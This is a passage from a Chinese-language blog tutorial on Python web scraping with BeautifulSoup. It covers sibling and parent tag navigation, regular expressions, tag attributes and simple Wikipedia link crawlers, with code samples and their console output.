class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr <span class="class"><span class="keyword">class</span>=</span><span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift1&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Vegetable Basket</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">This vegetable basket is the perfect gift <span class="keyword">for</span> your health conscious (<span class="keyword">or</span> overweight) friends!</span><br><span class="line">&lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Now with super-colorful bell peppers!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">15.00</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img1.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift2&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Russian Nesting Dolls</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">Hand-painted by trained monkeys, these exquisite dolls are priceless! And by <span class="string">&quot;priceless,&quot;</span> we mean <span class="string">&quot;extremely expensive&quot;</span>! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;<span class="number">8</span> entire dolls per <span class="built_in">set</span>! Octuple the presents!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">000.52</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img2.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift3&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Fish Painting</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">If something seems fishy about <span class="keyword">this</span> painting, it<span class="number">&#x27;</span>s because it<span class="number">&#x27;</span>s a fish! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Also hand-painted by trained monkeys!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">10</span>,<span class="number">005.00</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img3.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift4&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Dead Parrot</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">This is an ex-parrot! &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Or maybe he<span class="number">&#x27;</span>s only resting?&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">0.50</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img4.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr class=<span class="string">&quot;gift&quot;</span> id=<span class="string">&quot;gift5&quot;</span>&gt;&lt;td&gt;</span><br><span class="line">Mystery Box</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">If you love suprises, <span class="keyword">this</span> mystery box is <span class="keyword">for</span> you! Do <span class="keyword">not</span> place on light-colored surfaces. May cause oil staining. &lt;span class=<span class="string">&quot;excitingNote&quot;</span>&gt;Keep your friends guessing!&lt;/span&gt;</span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">$<span class="number">1.50</span></span><br><span class="line">&lt;/td&gt;&lt;td&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../img/gifts/img6.jpg&quot;</span>/&gt;</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这段代码会打印产品列表里的所有行的产品，第一行表格标题除外</p>
<ul>
<li>首先，对象不能把自己作为兄弟标签，任何时候你获取一个标签的兄弟标签，都不会包含这个标签本身 </li>
<li>其次，这个函数只调用后面的兄弟标签（例如，如果我们选择一组标签中位于中间位置的一个标签，然后用 next_siblings() 函数，那么它就只会返回在它后面的兄弟标签）</li>
</ul>
<p>因此，选择标签行然后调用 next_siblings，可以选择表格中除了标题行以外的所有行</p>
<p><strong>处理父标签</strong></p>
<p>在抓取网页的时候，查找父标签的需求比查找子标签和兄弟标签要少很多</p>
<p>通常情况 下，如果以抓取网页内容为目的来观察 HTML 页面，我们都是从最上层标签开始的，然 后思考如何定位我们想要的数据块所在的位置，但是，偶尔在特殊情况下你也会用到 BeautifulSoup 的父标签查找函数，parent 和 parents</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bsObj.find(<span class="string">&quot;img&quot;</span>,&#123;<span class="string">&quot;src&quot;</span>:<span class="string">&quot;../img/gifts/img1.jpg&quot;</span>&#125;).parent.previous_sibling.get_text())</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line"></span><br><span class="line">$<span class="number">15.00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648697579687.png" class width="1648697579687"> 
<p>这段代码会打印 ../img/gifts/img1.jpg 这个图片对应商品的价格（previousSibling属性返回：同一树层级中指定节点的前一个节点，刚好就是商品的价格）</p>
<h2 id="PS-正则表达式"><a href="#PS-正则表达式" class="headerlink" title="PS:正则表达式"></a>PS:正则表达式</h2><p>正则表达式，可以识别正则字符串（regular string），也就是说，它们可以这么定义：“如果你给我的字符串符合规则，我就返回它，或者是如果字符串不符合规则，我就忽略它”</p>
<p>正则表达式用于匹配一个符合规则的字符串，这在要求快速浏览大文档，以查找像电话号码和邮箱地址之类的字符串时是非常方便的</p>
<p>正则字符串，其实就是任意可以用一系列线性规则构成的字符串：</p>
<ul>
<li>字母“a”至少出现一次</li>
<li>后面跟着字母“b”重复 5 次</li>
<li>后面再跟字母“c”重复任意偶数次</li>
<li>最后一位是字母“d”，也可以没有</li>
</ul>
<p>满足上面规则的字符串有：“aaaabbbbbccccd”，“aabbbbbcc”等（有无穷多种变化），而正则表达式就是表达这组规则的缩写，这组规则的正则表达式如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa*bbbbb(cc)*(d|)</span><br></pre></td></tr></table></figure>
<ul>
<li>aa<em> ：a 后面跟着的 `a</em>` 表示“重复任意次 a，包括 0 次”（意思就是a重复任意a次）</li>
<li>bbbbb ：这没有什么特别的（就是重复 5 次 b）</li>
<li>(cc)* ：任意偶数个字符都可以编组，这个规则是用括号两个 c，然后后面跟一个星号，表示有 任意次两个 c（也可以是 0 次） </li>
<li>(d|) ：增加一个竖线（|）在表达式里表示“或”，本例是表示：增加一个后面跟着“\x00”的 d，或者只有一个“\x00”（这样就可以保证字符串结尾为“d”或者“\x00”）</li>
</ul>
<p>常见的正则表达式：</p>
<ul>
<li><p>限定符</p>
<ul>
<li>?（问号）：表示符号前的字符需要出现0次或1次</li>
<li>*（星号）：表示符号前的字符可以出现0次或多次</li>
<li>+（加号）：表示符号前的字符可以出现1次或多次</li>
<li>{n,m}（花括号）：表示符号前面的字符需要出现n~m次</li>
<li>注意：当需要对多个字符进行操作时，可以先把字符括起来，然后在后面添加限定符</li>
</ul>
</li>
<li><p>或运算符</p>
<ul>
<li>a (n|m)：程序会先去匹配“a+空格”，然后要么匹配“n”，要么匹配“m”</li>
</ul>
</li>
<li><p>字符类</p>
<ul>
<li>[ … ]（方括号）：方括号中的内容可以很灵活，可以是单个字母，也可以用 “-” 来指定范围</li>
<li>^ （尖号，脱字符）：只能在方括号内部使用，表示把所写入的内容除外</li>
</ul>
</li>
<li><p>元字符</p>
<ul>
<li>\d ：代表数字字符（相当于[0 - 9]）</li>
<li>\w ：代表单词字符</li>
<li>\s ：代表空白字符（包括Tab字符，换行字符）</li>
<li>\D ：代表非数字字符（相当于[ ^ 0 - 9]）</li>
<li>\W ：代表非单词字符</li>
<li>\S ：代表非空白字符（包括Tab字符，换行字符）</li>
<li>.（句点）：代表不包含换行字符的任意字符</li>
<li>^ n：匹配行首的字符“n”</li>
<li>n $：匹配行尾的字符“n”</li>
</ul>
</li>
</ul>
<p>正则表达式中的贪婪匹配和懒惰匹配：</p>
<ul>
<li>贪婪匹配：“ * ”，“ + ”，“ {} ”，都是默认采用贪婪匹配，它们会尽可能多的匹配字符</li>
<li>懒惰匹配：如果在“ * ”，“ + ”，“ {} ”的后面加“ ? ”，就可以把它们切换为懒惰匹配，它们会尽可能少的匹配字符</li>
</ul>
<h2 id="通过正则表达式查找标签"><a href="#通过正则表达式查找标签" class="headerlink" title="通过正则表达式查找标签"></a>通过正则表达式查找标签</h2><p>在本例中，我们直接通过商品图片的文件路径来查找：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">images = bsObj.findAll(<span class="string">&quot;img&quot;</span>,&#123;<span class="string">&quot;src&quot;</span>:re.<span class="built_in">compile</span>(<span class="string">&quot;\.\.\/img\/gifts/img.*\.jpg&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">    <span class="built_in">print</span>(image[<span class="string">&quot;src&quot;</span>])</span><br></pre></td></tr></table></figure>
<p>re.compile()，是用来优化正则的，它将正则表达式转化为对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">../img/gifts/img1.jpg</span><br><span class="line">../img/gifts/img2.jpg</span><br><span class="line">../img/gifts/img3.jpg</span><br><span class="line">../img/gifts/img4.jpg</span><br><span class="line">../img/gifts/img6.jpg</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>现在解释一下这个正则表达式的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">&quot;\.\.\/img\/gifts/img.*\.jpg&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>首先用转义符号索引两个“ . ”，然后用转义符号索引“/img”，“/gifts”，“/img”（其实这里的转义符号可以不加，因为“/”没有什么特殊含义），“ .* ”代表任意字符出现0次或者多次（这里改成“+”也没有什么问题），最后索引“.jpg”</p>
<h2 id="获取标签的属性"><a href="#获取标签的属性" class="headerlink" title="获取标签的属性"></a>获取标签的属性</h2><p>在网络数据采集时你经常不需要查找标签的内容，而是需要查找标签属性，对于一个标签对象，可以用下面的代码获取它的全部属性：（要注意这行代码返回的是一个 Python 字典对象，可以获取和操作这些属性）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myTag.attrs</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bsObj.img.attrs)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">&#123;<span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;../img/gifts/logo.jpg&#x27;</span>, <span class="string">&#x27;style&#x27;</span>: <span class="string">&#x27;float:left;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648709275191.png" class width="1648709275191">  
<p>要获取图片的资源位置 src，可以用下面这行代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myImgTag.attrs[<span class="string">&quot;src&quot;</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bsObj.img.attrs[<span class="string">&quot;src&quot;</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">../img/gifts/logo.jpg</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h2 id="遍历单个域名"><a href="#遍历单个域名" class="headerlink" title="遍历单个域名"></a>遍历单个域名</h2><p>我们需要先进行一个游戏：维基百科六度分隔理论，是把两个不相干的主题用一个总数不超过六条的主题连接起来</p>
<p>我们将创建一个项目来实现“维基百科六度分隔理论”的查找方法，要实现从 埃里克· 艾德尔 的词条页面（<code>https://en.wikipedia.org/wiki/Eric_Idle</code>）开始，经过最少的链接点击次数找到 凯文· 贝肯 的词条页面（<code>https://en.wikipedia.org/wiki/Kevin_Bacon</code>）</p>
<p>首先进行页面分析：</p>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648801080593.png" class width="1648801080593"> 
<p>鼠标移动到某个词条页面上时，对应的 HTML 代码会高亮，由此可以大致锁定词条页面对应的 HTML 标签（<code>&lt;a&gt;</code>），可以用以下代码来收集所有的 <code>&lt;a&gt;</code> 标签：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://en.wikipedia.org/wiki/Kevin_Bacon&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;href&#x27;</span> <span class="keyword">in</span> link.attrs:</span><br><span class="line">        <span class="built_in">print</span>(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">/wiki/Wikipedia:Protection_policy<span class="comment">#semi</span></span><br><span class="line"><span class="comment">#mw-head</span></span><br><span class="line"><span class="comment">#searchInput</span></span><br><span class="line">/wiki/Kevin_Bacon_(disambiguation)</span><br><span class="line">/wiki/File:Kevin_Bacon_SDCC_2014.jpg</span><br><span class="line">/wiki/Philadelphia,_Pennsylvania</span><br><span class="line">/wiki/Kevin_Bacon_filmography</span><br><span class="line">/wiki/Kyra_Sedgwick</span><br><span class="line">/wiki/Sosie_Bacon</span><br><span class="line"><span class="comment">#cite_note-1</span></span><br><span class="line">/wiki/Edmund_Bacon_(architect)</span><br><span class="line">/wiki/Michael_Bacon_(musician)</span><br><span class="line">    </span><br><span class="line">.................................</span><br><span class="line">    </span><br><span class="line">//foundation.wikimedia.org/wiki/Terms_of_Use</span><br><span class="line">//foundation.wikimedia.org/wiki/Privacy_policy</span><br><span class="line">//www.wikimediafoundation.org/</span><br><span class="line">https://foundation.wikimedia.org/wiki/Privacy_policy</span><br><span class="line">/wiki/Wikipedia:About</span><br><span class="line">/wiki/Wikipedia:General_disclaimer</span><br><span class="line">//en.wikipedia.org/wiki/Wikipedia:Contact_us</span><br><span class="line">//en.m.wikipedia.org/w/index.php?title=Kevin_Bacon&amp;mobileaction=toggle_view_mobile</span><br><span class="line">https://www.mediawiki.org/wiki/Special:MyLanguage/How_to_contribute</span><br><span class="line">https://stats.wikimedia.org/<span class="comment">#/en.wikipedia.org</span></span><br><span class="line">https://foundation.wikimedia.org/wiki/Cookie_statement</span><br><span class="line">https://wikimediafoundation.org/</span><br><span class="line">https://www.mediawiki.org/</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>发现有一些条目不是我们需要的内容（这里只展示部分），现在要近一步对样本进行分析：</p>
<p>首先需要比较“词条链接”和“其他链接”的差异，发现“词条链接”有3个共同点：</p>
<ul>
<li>它们都在 id 是 bodyContent 的 div 标签里（利用 find 嵌套可以解决）</li>
<li>URL 链接不包含分号（用正则解决）</li>
<li>URL 链接都以 /wiki/ 开头（用正则解决）</li>
</ul>
<p>改进爬虫脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://en.wikipedia.org/wiki/Kevin_Bacon&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> bsObj.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;bodyContent&quot;</span>&#125;).findAll(<span class="string">&quot;a&quot;</span>,href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/wiki/)((?!:).)*$&quot;</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;href&#x27;</span> <span class="keyword">in</span> link.attrs:</span><br><span class="line">        <span class="built_in">print</span>(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">/wiki/Kevin_Bacon_(disambiguation)</span><br><span class="line">/wiki/Philadelphia,_Pennsylvania</span><br><span class="line">/wiki/Kevin_Bacon_filmography</span><br><span class="line">/wiki/Kyra_Sedgwick</span><br><span class="line">/wiki/Sosie_Bacon</span><br><span class="line">/wiki/Edmund_Bacon_(architect)</span><br><span class="line"></span><br><span class="line">.................................</span><br></pre></td></tr></table></figure>
<p>如果你运行代码，就会看到维基百科上 凯文·贝肯 词条里所有指向其他词条的链接，但是现在找到的所有词条链接都是静态的模式，我们需要对其进行修改：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">nowTime=time.time()</span><br><span class="line">random.seed(nowTime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlinks</span>(<span class="params">articleUrl</span>):</span></span><br><span class="line">    html = urlopen(<span class="string">&quot;http://en.wikipedia.org&quot;</span>+articleUrl)</span><br><span class="line">    bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> bsObj.find(<span class="string">&quot;div&quot;</span>,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;bodyContent&quot;</span>&#125;).findAll(<span class="string">&quot;a&quot;</span>,href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/wiki/)((?!:).)*$&quot;</span>))</span><br><span class="line"></span><br><span class="line">links = getlinks(<span class="string">&quot;/wiki/Kevin_Bacon&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(links) &gt; <span class="number">0</span>:</span><br><span class="line">    newArticle = links[random.randint(<span class="number">0</span> ,<span class="built_in">len</span>(links)-<span class="number">1</span>)].attrs[<span class="string">&quot;href&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(newArticle)</span><br><span class="line">    links = getlinks(newArticle)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">/wiki/Seattle_International_Film_Festival</span><br><span class="line">/wiki/Bernardo_Bertolucci</span><br><span class="line">/wiki/The_Dreamers_(<span class="number">2003</span>_film)</span><br><span class="line">/wiki/Classical_Hollywood</span><br><span class="line">/wiki/Make-Up_Artists_and_Hair_Stylists_Guild_Awards</span><br></pre></td></tr></table></figure>
<p>程序的逻辑就是，先爬取某个词条里所有指向其他词条的链接，然后用随机数再次打开其中一个链接，重复进行此操作</p>
<p>为了完成“维基百科六度分隔理论”，还需要对收集词条链接的数据进行分析，那就是后话了</p>
<h2 id="采集整个网站"><a href="#采集整个网站" class="headerlink" title="采集整个网站"></a>采集整个网站</h2><p>遍历整个网站的网络数据是一件费时费力的事情，但是采集它们有许多好处</p>
<p>一个简单的方法就是：从顶级页面开始（比如主页），然后搜索页面上的所有链接，形成列表，再去采集这些链接的每一个页面，然后把在每个页面上找到的链接形成新的列表，重复执行下一轮采集</p>
<p>很明显，这是一个复杂度增长很快的情形，为了避免一个页面被采集两次，链接去重是非常重要的，在代码运行时，把已发现的所有链接都放到一起，并保存在方便查询的列表里，只有“新”链接才会被采集，之后再从页面中搜索其他链接：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pages = <span class="built_in">set</span>()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLinks</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="keyword">global</span> pages</span><br><span class="line">    html = urlopen(<span class="string">&quot;http://en.wikipedia.org&quot;</span>+pageUrl)</span><br><span class="line">    bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/wiki/)&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;href&#x27;</span> <span class="keyword">in</span> link.attrs:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> pages:</span><br><span class="line">                newPage = link.attrs[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(newPage)</span><br><span 